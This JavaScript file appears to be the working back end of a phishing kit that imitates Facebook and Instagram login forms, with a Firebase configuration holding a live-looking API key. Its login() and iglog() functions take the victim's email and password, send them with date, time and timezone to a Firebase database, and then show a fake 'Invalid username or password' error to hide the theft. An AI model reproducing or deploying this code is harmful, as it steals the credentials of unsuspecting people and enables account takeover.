// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCu4nH9IkM1QcDsEXBL1tKTCyw532ByhT0",
  authDomain: "artrabstarz.firebaseapp.com",
  databaseURL: "https://artrabstarz-default-rtdb.firebaseio.com",
  projectId: "artrabstarz",
  storageBucket: "artrabstarz.appspot.com",
  messagingSenderId: "307318436548",
  appId: "1:307318436548:web:13011b1905760fbc0f8f91",
  measurementId: "G-DLJBEV9EME",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

/* function iglog() {
  // Attempt anonymous sign-in with Firebase Authentication
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      // Display Firebase auth errors in the error box
      showError(errorMessage);
    });

  var email = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (email !== "" && password !== "") {
    // Push the data to Firebase Realtime Database
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    // Use setTimeout to simulate the delay, then display an error message in the error box
    setTimeout(function () {
      showError("Invalid username or password");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  } else {
    // Show an error if email or password is missing
    showError("Please enter both email and password.");
  }
}

function showError(message) {
  var errorBox = document.getElementById("ig_error_box");
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError() {
  var errorBox = document.getElementById("ig_error_box");
  errorBox.style.display = "none";
}
  */

function login() {
  // Attempt anonymous sign-in with Firebase Authentication
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      // Display Firebase auth errors in the error box
      showError(errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    // Push the data to Firebase Realtime Database
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    // Use setTimeout to simulate the delay, then display an error message in the error box
    setTimeout(function () {
      showError("Invalid username or password");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    // Show an error if email or password is missing
    showError("Please enter both email and password.");
  }
}

function showError(message) {
  var errorBox = document.getElementById("error_box");
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError() {
  var errorBox = document.getElementById("error_box");
  errorBox.style.display = "none";
}

function iglog() {
  // Attempt anonymous sign-in with Firebase Authentication
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      // Display Firebase auth errors in the error box
      showError(errorMessage);
    });

  var email = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (email !== "" && password !== "") {
    // Push the data to Firebase Realtime Database
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    // Use setTimeout to simulate the delay, then display an error message in the error box
    setTimeout(function () {
      showError("Invalid username or password");
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  } else {
    // Show an error if email or password is missing
    showError("Please enter both email and password.");
  }
}

function showError(message) {
  var errorBox = document.getElementById("ig_error_box");
  errorBox.style.display = "block";
  errorBox.querySelector("div:nth-child(2)").textContent = message;
}

function hideError() {
  var errorBox = document.getElementById("ig_error_box");
  errorBox.style.display = "none";
}
